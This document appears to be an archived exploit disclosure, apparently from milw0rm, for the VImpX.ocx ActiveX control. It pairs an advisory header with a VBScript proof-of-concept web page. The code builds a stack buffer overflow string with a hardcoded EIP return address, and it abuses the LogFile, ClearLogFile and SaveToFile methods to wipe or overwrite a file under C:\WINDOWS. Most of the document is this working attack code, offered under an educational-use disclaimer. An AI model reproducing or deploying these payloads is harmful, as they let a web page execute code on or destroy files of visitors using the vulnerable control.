@@ -1,0 +1,79 @@
+-----------------------------------------------------------------------------
+ db Software Laboratory VImpX (VImpX.ocx) Multiple vulnerabilities
+ url: http://www.dbsoftlab.com/
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://www.shinnai.net
+ 
+ Info:
+ File:		VImpX.ocx v. 4.8.8.0
+ CLSID:		{7600707B-9F47-416D-8AB5-6FD96EA37968}
+ ProgID:	VImpX.VImpAX
+ Description:	VImpAX Control
+ 
+ Marked as:
+  RegKey Safe for Script: False
+  RegKey Safe for Init: False
+  Implements IObjectSafety: True
+  IDisp Safe: Safe for untrusted: caller,data  
+  IPStorage Safe: Safe for untrusted: caller,data
+ 
+ Vulnerbale method:
+ Property Let LogFile As String
+ Sub ClearLogFile
+ Sub SaveToFile (ByVal FileName As String)
+
+ Bug(s):
+ #1 Passing an overly long string (more than 256 bytes), will lead into
+    a stack based buffer overflow which allows arbitrary code execution
+  
+ #2 The "LogFile()" method doesn't check user supplied arguments so we can
+    use it to store the file name we want to clear and then the
+    "ClearLogFile()" to delete the content of the file
+
+ #3 The "SaveToFile()" method doesn't check user supplied arguments so we
+    can use it to overwrite the content of the file name passed as
+    argument.
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on Windows XP Professional SP3 all patched, with Internet Explorer 7
+-----------------------------------------------------------------------------
+<object classid='clsid:7600707B-9F47-416D-8AB5-6FD96EA37968' id='test' width='20' height='20'></object>
+
+<input language=VBScript onclick=bof() type=button value='Click here to start the Remote Buffer Overflow test' style="width: 361px; height: 24px" size=21>
+
+<input language=VBScript onclick=afd() type=button value='Click here to start the File Content Deletion test' style="width: 361px; height: 24px" size=21>
+
+<input language=VBScript onclick=afc() type=button value='Click here to start the File Content Corruption test' style="width: 361px; height: 24px" size=21>
+
+
+<script language='vbscript'>
+ Sub bof
+  buff = String(256,"A") 
+  EDI  = unescape("BBBB") 
+  ESI  = unescape("CCCC")
+  EBX  = unescape("DDDD") 
+  EIP  = unescape("%C6%91%3A%7E") 'unescape("EEEE") 
+  buf2 = unescape("FFFFFFFFFFFFFFFFFFFF") 
+  memo = unescape("%00%00%01%00") 
+  rest = unescape("GGGG") + String(2000, "H")
+  egg = buff + EDI + ESI + EBX + EIP + buf2 + memo + rest
+  test.LogFile = egg
+ End Sub
+
+ Sub afd
+  test.LogFile = "C:\WINDOWS\_system.ini"
+  test.ClearLogFile
+  MsgBox "Exploit completed..."
+ End Sub
+
+ Sub afc
+  test.SaveToFile "C:\WINDOWS\_system.ini"
+  MsgBox "Exploit completed..."
+ End Sub
+</script>
+
+# milw0rm.com [2008-10-24]
